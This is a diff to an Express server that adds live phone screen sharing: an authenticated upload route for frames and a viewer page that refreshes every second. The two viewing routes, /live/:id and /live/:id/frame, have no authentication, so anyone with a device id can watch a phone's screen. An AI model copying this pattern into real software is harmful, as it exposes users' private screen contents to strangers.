@@ -494,6 +494,48 @@ app.get('/media/:id', (req, res) => {
     res.send(Buffer.from(m.data, 'base64'));
 });
 
+// ---------- v8.8: live screen share (frame poll → auto-refresh link) ----------
+
+const liveFrames = new Map();   // device_id -> {data_b64, ts}
+
+// Phone → Server: upload a live screen frame (JPEG base64).
+app.post('/live_frame', authMiddleware, (req, res) => {
+    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
+    const data = (req.body && req.body.data_b64) || '';
+    if (!data) return res.json({ ok: false });
+    liveFrames.set(deviceId, { data_b64: data, ts: Date.now() });
+    touchDevice(deviceId);
+    res.json({ ok: true });
+});
+
+// Laptop → Server: latest live frame as JPEG binary (auto-refresh target).
+app.get('/live/:id/frame', (req, res) => {
+    const f = liveFrames.get(req.params.id);
+    if (!f) {
+        res.set('Content-Type', 'image/jpeg');
+        return res.send(Buffer.from(
+            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64'));
+    }
+    res.set('Content-Type', 'image/jpeg');
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+    res.send(Buffer.from(f.data_b64, 'base64'));
+});
+
+// Laptop → Server: live screen HTML page (opens in browser, auto-refresh 1s).
+app.get('/live/:id', (req, res) => {
+    const id = String(req.params.id).replace(/[^a-zA-Z0-9-]/g, '');
+    res.set('Content-Type', 'text/html');
+    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>Gokul Live Screen</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}
+img{max-width:100%;max-height:100vh;object-fit:contain}span{position:fixed;top:10px;left:10px;color:#0f0;font:bold 14px monospace;background:#000c;padding:4px 8px}</style>
+</head><body><img id="s" src="/live/${id}/frame"><span id="t"></span>
+<script>setInterval(()=>{document.getElementById('s').src='/live/${id}/frame?t='+Date.now();
+document.getElementById('t').textContent='LIVE • '+new Date().toLocaleTimeString()},1000);</script>
+</body></html>`);
+});
+
 // Start
 app.listen(PORT, () => {
     console.log('='.repeat(50));
